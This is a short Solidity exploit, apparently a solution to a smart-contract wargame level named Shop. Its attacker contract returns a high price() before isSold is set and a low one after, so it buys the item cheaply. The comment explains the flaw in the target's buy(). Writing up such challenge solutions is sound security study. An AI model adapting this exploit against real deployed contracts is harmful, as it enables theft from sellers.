/*
    Kind of a easy one if you try to change the way we solved Elevator (just a little bit of change)

    So, the vulnerability is in the 'buy()' function of our target contract, like the price function is called two times and 'isSold' is made to true before even the product was solved..But anyways

    Solution is well understood with this now..Cheers!
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Shop{
    function buy() external;
    function isSold() external returns(bool);
}

contract Buyer{
    Shop public target;

    constructor(address victim){
        target = Shop(victim);
    }

    function attack() external{
        target.buy();
    }

    function price() external returns (uint){
        if (target.isSold() == false){
            return 101;
        } else {
            return 1;
        }
    }
}